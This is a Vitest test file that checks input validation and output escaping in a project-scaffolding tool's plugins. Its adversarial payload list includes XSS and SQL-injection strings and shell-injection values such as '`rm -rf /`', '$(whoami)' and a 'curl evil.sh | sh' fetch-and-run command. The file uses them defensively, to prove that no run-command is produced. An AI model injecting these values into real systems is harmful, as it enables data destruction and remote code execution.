import { parse } from '@vue/compiler-sfc';
import { describe, expect, it } from 'vitest';
import {
  MAX_PACKAGE_NAME_LENGTH,
  appNameSchema,
  authorSchema,
  descriptionSchema,
  toValidate,
} from '../../src/core/validation.js';
import { escapeHtml } from '../../src/plugins/web-app/shared-questions.js';
import { electronTsPlugin } from '../../src/plugins/electron-ts/index.js';
import { webAppSpaPlugin } from '../../src/plugins/web-app/spa.js';
import { webAppStandaloneHtmlPlugin } from '../../src/plugins/web-app/standalone-html.js';
import type { Answers, StackfoldPlugin } from '../../src/core/types.js';

/**
 * SEC-001 — the adversarial payload matrix
 * (.agents/specs/sec-001-input-injection-validation.md, Step 1 table),
 * run against both the zod schemas directly (fast, no I/O — Invariant B,
 * SEC-001b) and the real render sinks across all three plugins
 * (Invariant A, SEC-001a) — a schema-only test would miss a regression in
 * `escapeHtml()`/`escapeScriptClose()`/`json()` themselves.
 *
 * Each plugin's own test file (`electron-ts-plugin.test.ts`,
 * `web-app-spa-plugin*.test.ts`, `web-app-standalone-html-plugin.test.ts`)
 * still owns its plugin-specific adversarial coverage (e.g. the full
 * real-`@vue/compiler-sfc` render-function proof for `vite-vue.ts`'s
 * `escapeScriptClose()`). This file is the shared matrix: one place that
 * runs every row across every plugin, so no plugin can regress silently
 * by being the one nobody re-checked.
 */

function fileContent(plugin: StackfoldPlugin, answers: Answers, path: string): string {
  const entry = plugin.buildBlueprint(answers).files.find((f) => f.path === path);
  if (!entry) throw new Error(`${path} not in ${plugin.id}'s blueprint`);
  return entry.content.toString();
}

const BASE_ELECTRON: Answers = { appName: 'Demo App', description: 'A demo', author: 'Ada Lovelace' };
const BASE_REACT: Answers = { appName: 'Demo App', description: 'A demo', author: 'Ada Lovelace', framework: 'react' };
const BASE_VUE: Answers = { appName: 'Demo App', description: 'A demo', author: 'Ada Lovelace', framework: 'vue' };
const BASE_VANILLA: Answers = {
  appName: 'Demo App',
  description: 'A demo',
  author: 'Ada Lovelace',
  framework: 'vanilla',
};
const BASE_STANDALONE: Answers = { appName: 'Demo App', description: 'A demo', author: 'Ada Lovelace' };

describe('core/validation.ts — schemas (direct, no I/O)', () => {
  it('exports MAX_PACKAGE_NAME_LENGTH as npm\'s 214-character registry limit', () => {
    expect(MAX_PACKAGE_NAME_LENGTH).toBe(214);
  });

  describe('appNameSchema', () => {
    it.each(['', '   ', '!!!', '\n', '\t'])('rejects %j', (value) => {
      expect(appNameSchema.safeParse(value).success).toBe(false);
    });

    it.each(['my-app', 'My Cool App', 'app2', '3D Viewer'])('accepts %j', (value) => {
      expect(appNameSchema.safeParse(value).success).toBe(true);
    });

    it('rejects a 10,000-character string (over the 100-character max)', () => {
      const result = appNameSchema.safeParse('a'.repeat(10_000));
      expect(result.success).toBe(false);
    });

    it('rejects embedded control characters', () => {
      expect(appNameSchema.safeParse('My\x01App').success).toBe(false);
    });

    it('accepts an RTL-override character and an emoji — not a structural risk, not blocklisted', () => {
      const result = appNameSchema.safeParse('App‮😀Name');
      expect(result.success).toBe(true);
    });

    it('accepts HTML- and shell-metacharacter payloads — escaping, not blocklisting, is the defense', () => {
      for (const payload of [
        '<script>alert(1)</script>App',
        '</script><script>evil()</script>App',
        'App"; DROP TABLE x; --',
        'App`rm -rf /`',
        'App$(whoami)',
      ]) {
        expect(appNameSchema.safeParse(payload).success).toBe(true);
      }
    });
  });

  describe('descriptionSchema / authorSchema — optional (empty allowed), still bounded', () => {
    it.each([descriptionSchema, authorSchema])('accepts an empty string', (schema) => {
      expect(schema.safeParse('').success).toBe(true);
    });

    it.each([descriptionSchema, authorSchema])('trims whitespace-only input down to an accepted empty string', (schema) => {
      const result = schema.safeParse('   ');
      expect(result.success).toBe(true);
      if (result.success) expect(result.data).toBe('');
    });

    it('descriptionSchema rejects a 10,000-character string (over the 200-character max)', () => {
      expect(descriptionSchema.safeParse('a'.repeat(10_000)).success).toBe(false);
    });

    it('authorSchema rejects a 10,000-character string (over the 150-character max)', () => {
      expect(authorSchema.safeParse('a'.repeat(10_000)).success).toBe(false);
    });

    it.each([descriptionSchema, authorSchema])('rejects embedded control characters', (schema) => {
      expect(schema.safeParse('A\x07B').success).toBe(false);
    });

    it.each([descriptionSchema, authorSchema])('rejects an embedded newline (single-line fields)', (schema) => {
      expect(schema.safeParse('line one\nline two').success).toBe(false);
    });

    it.each([descriptionSchema, authorSchema])(
      'accepts an RTL-override character and an emoji — not blocklisted',
      (schema) => {
        expect(schema.safeParse('Text ‮😀 more').success).toBe(true);
      }
    );

    it.each([descriptionSchema, authorSchema])('accepts HTML- and shell-metacharacter payloads', (schema) => {
      for (const payload of [
        '<script>alert(1)</script>',
        '</script><script>evil()</script>',
        '"; DROP TABLE x; --',
        '`rm -rf /`',
        '$(whoami)',
      ]) {
        expect(schema.safeParse(payload).success).toBe(true);
      }
    });
  });

  describe('toValidate()', () => {
    it('adapts a passing schema to `true`', () => {
      expect(toValidate(appNameSchema)('My App')).toBe(true);
    });

    it('adapts a failing schema to its first zod issue message, as a string', () => {
      expect(toValidate(appNameSchema)('')).toEqual(expect.any(String));
    });

    it('coerces a non-string AnswerValue via String() before validating', () => {
      // QuestionDefinition.validate's contract is `(value: AnswerValue) => true | string`,
      // and AnswerValue includes boolean/number — toValidate must not throw on those.
      expect(() => toValidate(descriptionSchema)(true)).not.toThrow();
      expect(() => toValidate(descriptionSchema)(42)).not.toThrow();
    });
  });
});

describe('SEC-001a — adversarial matrix against the real render sinks', () => {
  describe('row: <script>alert(1)</script> — HTML text-node escaping (escapeHtml, all 3 plugins)', () => {
    const payload = '<script>alert(1)</script>';

    it('escapeHtml() (web-app\'s exported sink) neutralizes it directly', () => {
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('electron-ts: the rendered renderer index.html never contains a live <script> tag from appName/description', () => {
      const html = fileContent(electronTsPlugin, { ...BASE_ELECTRON, appName: payload, description: payload }, 'src/renderer/index.html');
      expect(html).not.toContain('<script>alert(1)</script>');
      expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it.each([
      ['react', BASE_REACT],
      ['vue', BASE_VUE],
      ['vanilla', BASE_VANILLA],
    ])('web-app-spa (%s): the rendered index.html never contains a live <script> tag from appName/description', (_framework, base) => {
      const html = fileContent(webAppSpaPlugin, { ...base, appName: payload, description: payload }, 'index.html');
      expect(html).not.toContain('<script>alert(1)</script>');
      expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('web-app-standalone-html: the rendered index.html never contains a live <script> tag from appName/description', () => {
      const html = fileContent(webAppStandaloneHtmlPlugin, { ...BASE_STANDALONE, appName: payload, description: payload }, 'index.html');
      expect(html).not.toContain('<script>alert(1)</script>');
      expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    });
  });

  describe('row: </script><script>evil()</script> — SFC parser </script>-matching (escapeScriptClose, vite-vue)', () => {
    const payload = '</script><script>evil()</script>';

    it('App.vue parses as a single, uncorrupted <script setup> block, and the escaped literal still evaluates back to the exact original payload', () => {
      const vue = fileContent(webAppSpaPlugin, { ...BASE_VUE, appName: payload }, 'src/App.vue');
      const { descriptor, errors } = parse(vue, { filename: 'App.vue' });
      expect(errors).toEqual([]);
      expect(descriptor.scriptSetup?.content).toContain('APP_NAME');
      expect(descriptor.template?.content).toContain('{{ APP_NAME }}');

      // eslint-disable-next-line no-eval
      const runtimeValue: unknown = eval(descriptor.scriptSetup!.content.match(/APP_NAME = (.*);/)![1]!);
      expect(runtimeValue).toBe(payload);
    });
  });

  describe('row: shell metacharacters never reach an interpreted shell string (ExecaProcessRunner, shell:false)', () => {
    const payloads = ['"; DROP TABLE x; --', '`rm -rf /`', '$(whoami)', 'App`; curl evil.sh | sh`'];

    it.each([
      ['electron-ts', electronTsPlugin, BASE_ELECTRON],
      ['web-app-spa (react)', webAppSpaPlugin, BASE_REACT],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin, BASE_STANDALONE],
    ])('%s: no adversarial appName/description/author ever produces a "run-command" postAction or leaks into any postAction', (_name, plugin, base) => {
      for (const payload of payloads) {
        const blueprint = (plugin as StackfoldPlugin).buildBlueprint({
          ...base,
          appName: `${base.appName as string}${payload}`.slice(0, 90),
          description: payload,
          author: payload,
        });
        for (const action of blueprint.postActions) {
          expect(action.kind).not.toBe('run-command');
          expect(JSON.stringify(action)).not.toContain(payload);
        }
      }
    });
  });

  describe('row: U+2028/U+2029 (JS line/paragraph separators) — JSON.stringify-into-JS-source stays valid JS', () => {
    const payload = 'Before After End';

    it('electron-ts: package.json\'s productName round-trips through real JSON.parse unchanged', () => {
      const pkg = fileContent(electronTsPlugin, { ...BASE_ELECTRON, appName: `App${payload}` }, 'package.json');
      expect(() => JSON.parse(pkg)).not.toThrow();
      expect((JSON.parse(pkg) as { productName: string }).productName).toBe(`App${payload}`);
    });

    it('vite-react: the APP_NAME module constant is valid, evaluable JS source (no unescaped line/paragraph separator breaks the statement)', () => {
      const tsx = fileContent(webAppSpaPlugin, { ...BASE_REACT, appName: `App${payload}` }, 'src/App.tsx');
      const line = tsx.split('\n').find((l) => l.startsWith('const APP_NAME'));
      expect(line).toBeDefined();
      // eslint-disable-next-line @typescript-eslint/no-implied-eval
      const value = new Function(`${line as string}\nreturn APP_NAME;`)() as string;
      expect(value).toBe(`App${payload}`);
    });

    it('vite-vue: the APP_NAME module constant inside <script setup> is valid, evaluable JS source', () => {
      const vue = fileContent(webAppSpaPlugin, { ...BASE_VUE, appName: `App${payload}` }, 'src/App.vue');
      const line = vue.split('\n').find((l) => l.startsWith('const APP_NAME'));
      expect(line).toBeDefined();
      // eslint-disable-next-line @typescript-eslint/no-implied-eval
      const value = new Function(`${line as string}\nreturn APP_NAME;`)() as string;
      expect(value).toBe(`App${payload}`);
    });

    it('vite-vanilla: the APP_NAME module constant is valid, evaluable JS source', () => {
      const ts = fileContent(webAppSpaPlugin, { ...BASE_VANILLA, appName: `App${payload}` }, 'src/main.ts');
      const line = ts.split('\n').find((l) => l.startsWith('const APP_NAME'));
      expect(line).toBeDefined();
      // eslint-disable-next-line @typescript-eslint/no-implied-eval
      const value = new Function(`${line as string}\nreturn APP_NAME;`)() as string;
      expect(value).toBe(`App${payload}`);
    });
  });

  describe('row: 10,000-character string — rejected before buildBlueprint() ever runs (new zod .max())', () => {
    const overlong = 'a'.repeat(10_000);

    it('appNameSchema / descriptionSchema / authorSchema all reject it directly', () => {
      expect(appNameSchema.safeParse(overlong).success).toBe(false);
      expect(descriptionSchema.safeParse(overlong).success).toBe(false);
      expect(authorSchema.safeParse(overlong).success).toBe(false);
    });

    it.each([
      ['electron-ts', electronTsPlugin],
      ['web-app-spa', webAppSpaPlugin],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin],
    ])('%s: the appName/description/author questions\' validate() rejects it at the Prompter boundary', (_name, plugin) => {
      for (const id of ['appName', 'description', 'author']) {
        const question = (plugin as StackfoldPlugin).questions().find((q) => q.id === id);
        expect(question).toBeDefined();
        expect(question?.validate?.(overlong)).toEqual(expect.any(String));
      }
    });
  });

  describe('row: "   " (whitespace-only) — appName rejected, description/author trimmed-accepted', () => {
    it.each([
      ['electron-ts', electronTsPlugin],
      ['web-app-spa', webAppSpaPlugin],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin],
    ])('%s: appName validate() rejects "   "', (_name, plugin) => {
      const question = (plugin as StackfoldPlugin).questions().find((q) => q.id === 'appName');
      expect(question?.validate?.('   ')).toEqual(expect.any(String));
    });

    it.each([
      ['electron-ts', electronTsPlugin],
      ['web-app-spa', webAppSpaPlugin],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin],
    ])('%s: description/author validate() accepts "   " (optional, trimmed)', (_name, plugin) => {
      for (const id of ['description', 'author']) {
        const question = (plugin as StackfoldPlugin).questions().find((q) => q.id === id);
        expect(question?.validate?.('   ') ?? true).toBe(true);
      }
    });
  });

  describe('row: embedded \\n — rejected in every single-line field', () => {
    it.each([
      ['electron-ts', electronTsPlugin],
      ['web-app-spa', webAppSpaPlugin],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin],
    ])('%s: appName/description/author validate() all reject an embedded newline', (_name, plugin) => {
      for (const id of ['appName', 'description', 'author']) {
        const question = (plugin as StackfoldPlugin).questions().find((q) => q.id === id);
        expect(question?.validate?.('line one\nline two')).toEqual(expect.any(String));
      }
    });
  });

  describe('row: RTL-override (U+202E) + emoji — not a control character, not a structural risk, not rejected', () => {
    const payload = 'App‮😀Name';

    it.each([
      ['electron-ts', electronTsPlugin],
      ['web-app-spa', webAppSpaPlugin],
      ['web-app-standalone-html', webAppStandaloneHtmlPlugin],
    ])('%s: appName validate() accepts it', (_name, plugin) => {
      const question = (plugin as StackfoldPlugin).questions().find((q) => q.id === 'appName');
      expect(question?.validate?.(payload)).toBe(true);
    });

    it('electron-ts: it renders through to package.json/HTML without corrupting JSON or HTML structure', () => {
      const pkg = fileContent(electronTsPlugin, { ...BASE_ELECTRON, appName: payload }, 'package.json');
      expect(() => JSON.parse(pkg)).not.toThrow();
      const html = fileContent(electronTsPlugin, { ...BASE_ELECTRON, appName: payload }, 'src/renderer/index.html');
      expect(html).toContain(payload);
    });
  });
});
